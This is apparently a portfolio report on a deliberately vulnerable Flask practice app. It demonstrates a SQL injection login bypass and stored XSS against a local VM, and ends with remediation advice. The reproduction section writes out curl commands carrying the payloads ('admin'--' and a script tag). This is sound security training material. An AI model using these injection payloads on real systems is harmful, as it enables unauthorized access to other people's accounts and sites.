# webapp-fire — Portfolio Report

**Project:** webapp-fire — mini vulnerable Flask app  
**Role:** Author / tester  
**Date:** (replace with date)

## Summary
Deliberately vulnerable Flask app used to demonstrate two issues:
- **SQL Injection (login)** — authentication bypass via unparameterized SQL.
- **Stored XSS (comments)** — persistent script execution from user comments.

## Evidence (included)
- `sqli_response.txt`, `sqli_repeater_response.xml`, `screenshot_sqli_burp.png`  
- `xss_response.txt`, `xss_response_post.txt`, `screenshot_xss_alert.png`

### Note about `screenshot_xss_alert.png`
The current `screenshot_xss_alert.png` shows the Kali terminal running the screenshot command (fallback X11 message). To get a cleaner browser alert capture, trigger the payload in-browser within your isolated VM and replace the image file.

## Reproduction (concise)
# SQLi
curl -s -X POST -d "username=admin'--&password=x" http://10.0.2.15:5000/login -c cookies.txt -o sqli_response_post.txt
curl -s -L -b cookies.txt http://10.0.2.15:5000/ -o sqli_response.txt

# XSS
curl -s -X POST -d "name=attacker&comment=<script>alert('xss')</script>" http://10.0.2.15:5000/comment -b cookies.txt -c cookies.txt -o xss_response_post.txt
curl -s -L -b cookies.txt http://10.0.2.15:5000/ -o xss_response.txt

## Remediation (high level)
- Parameterize SQL queries (use `?` placeholders).  
- Hash passwords with `generate_password_hash` / `check_password_hash`.  
- Remove `|safe` and escape/sanitize user input.  
- Add CSP and secure cookie flags.

